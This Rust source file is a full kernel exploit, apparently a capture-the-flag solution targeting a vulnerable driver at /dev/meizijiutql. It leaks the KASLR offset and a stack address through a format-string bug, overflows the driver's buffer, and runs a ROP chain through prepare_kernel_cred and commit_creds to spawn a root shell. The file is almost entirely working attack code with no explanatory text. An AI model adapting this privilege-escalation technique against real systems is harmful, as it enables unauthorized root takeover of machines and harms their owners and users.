#![allow(non_upper_case_globals)]
#![allow(unused_mut)]
#![allow(unused_imports)]
#![allow(dead_code)]
#![allow(unused_assignments)]
#![allow(overflowing_literals)]
#![allow(unused_variables)]
#![allow(unused_macros)]
use colored::*;
use eval::eval;
use libc::*;
use std::arch::asm;
use std::ffi::CString;
use std::fs::File;
use std::io::Read;
use std::process;
use std::process::Command;

macro_rules! log {
    ($s:expr) => {
        println!(
            "[*] {} -> {}",
            stringify!($s).blue(),
            format!("0x{:x}", $s).yellow()
        );
    };
}
macro_rules! success {
    ($s:expr) => {
        println!("[+] Success: {}", $s.green());
    };
}
macro_rules! info {
    ($s:expr) => {
        println!("[*] Info: {}", $s.purple());
    };
}
macro_rules! error {
    ($s:expr) => {
        println!("[-] Error: {}", $s.red());
        process::exit(-1);
    };
}
macro_rules! open_rw {
    ($s:expr) => {
        nix::fcntl::open($s, nix::fcntl::OFlag::O_RDWR, nix::sys::stat::Mode::empty())
    };
}

static mut USER_CS: u64 = 0;
static mut USER_SS: u64 = 0;
static mut USER_RFLAGS: u64 = 0;
static mut USER_SP: u64 = 0;
fn save_status() {
    unsafe {
        asm!("mov {}, cs", out(reg) USER_CS);
        asm!("mov {}, ss", out(reg) USER_SS);
        asm!("mov {}, rsp", out(reg) USER_SP);
        asm!("pushf");
        asm!("pop {}", out(reg) USER_RFLAGS);
    }
    success!("Status saved.");
}

fn get_shell() {
    info!("Attempting to get root shell now: ");
    if (unsafe { getuid() } == 0) {
        success!("Get root shell.");
        let _ = Command::new("sh").spawn().expect("Getshell failed.").wait();
        process::exit(0);
    }
    error!("Failed to get root shell.");
}

static mut KASLR_OFF: u64 = 0;
static mut STACK_BASE: u64 = 0;
fn pwn() {
    unsafe {
        let mut buf: [c_char; 0x300] = [0; 0x300];
        let mut rop_chain: [c_ulong; 0x100] = [0; 0x100];
        let mut fmted_str = "%llx%llx%llx%llx%llxKASLR-LEAK: 0x%llx\n";
        let mut c_string = CString::new(fmted_str).expect("failed to create cstring");
        let fd = open_rw!("/dev/meizijiutql").expect("failed to open dev");

        info!("Leak KASLR.");
        strcpy(buf.as_mut_ptr(), c_string.as_ptr());
        ioctl(fd, 0x73311337, 0x100 as *const c_ulong);
        write(fd, buf.as_ptr() as *const c_void, 0x100);
        ioctl(fd, 0xDEADBEEF);
        ioctl(fd, 0x13377331);

        info!("Leak stack.");
        fmted_str = "%llx%llx%llx%llx%llx%llx%llx%llx%llxSTACK-LEAK: 0x%llx\n";
        c_string = CString::new(fmted_str).expect("failed to create cstring");
        strcpy(buf.as_mut_ptr(), c_string.as_ptr());
        ioctl(fd, 0x73311337, 0x100 as *const c_ulong);
        write(fd, buf.as_ptr() as *const c_void, 0x100);
        ioctl(fd, 0xDEADBEEF);
        ioctl(fd, 0x13377331);

        // let _ = system("dmesg > /tmp/leak".as_ptr() as *const i8);
        let mut fd_leak = File::open("/tmp/leak").unwrap();
        let mut dmesg_output = String::new();
        fd_leak.read_to_string(&mut dmesg_output).unwrap();
        // let dmesg_output = String::from_utf8_lossy(&dmesg_res.stdout);
        let lines = dmesg_output.lines();
        for i in lines {
            if i.contains("LEAK") {
                info!(i);
                let idx = i.find("LEAK: 0x").expect("Failed");
                let substring = &i[(idx + "LEAK: 0x".len())..];
                let trimmed_substring = substring.trim();
                if i.contains("KASLR") {
                    KASLR_OFF =
                        u64::from_str_radix(trimmed_substring, 16).unwrap() - 0xffffffff811c827f;
                    log!(KASLR_OFF);
                } else if i.contains("STACK") {
                    STACK_BASE = u64::from_str_radix(trimmed_substring, 16).unwrap() - 0x58;
                    log!(STACK_BASE);
                }
            }
        }

        let commit_creds_addr = KASLR_OFF + 0xffffffff81081410;
        let pop_rdi_ret = KASLR_OFF + 0xffffffff81001388;
        let magic_gadget = KASLR_OFF + 0xffffffff8138e238; // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8138e229 ; ret
        let pop_rsi_ret = KASLR_OFF + 0xffffffff81001fbd;
        let pop_rcx_ret = KASLR_OFF + 0xffffffff810674ff;
        let kpti_trampoline = KASLR_OFF + 0xffffffff81a00985; // pop2
        let prepare_kernel_cred_addr = KASLR_OFF + 0xffffffff81081790;
        let swapgs_popfq_ret = KASLR_OFF + 0xffffffff81a00d5a;
        let iretq_ret = KASLR_OFF + 0xffffffff81021762;
        for i in 0..0x280 {
            buf[i] = 0;
        }
        let ptr = &mut buf[0x200] as *mut c_char as *mut u64;
        *ptr = STACK_BASE - 0x80;

        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        write(fd, buf.as_ptr() as *const c_void, 0x208);

        let mut i = 0;
        let mut push = |x| {
            rop_chain[i] = x;
            i += 1;
        };
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(pop_rdi_ret);
        push(0);
        push(prepare_kernel_cred_addr);
        push(pop_rcx_ret);
        push(0);
        push(magic_gadget);
        push(commit_creds_addr);
        push(swapgs_popfq_ret);
        push(0);
        push(iretq_ret);
        // push(kpti_trampoline);
        // push(0);
        // push(0);
        push(get_shell as u64);
        push(USER_CS);
        push(USER_RFLAGS);
        push(USER_SP);
        push(USER_SS);

        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        ioctl(fd, 0x73311337, 0x200 as *const c_ulong);
        write(fd, rop_chain.as_ptr() as *const c_void, i * 8);
    }
}

fn main() {
    save_status();

    pwn();
    get_shell();
}
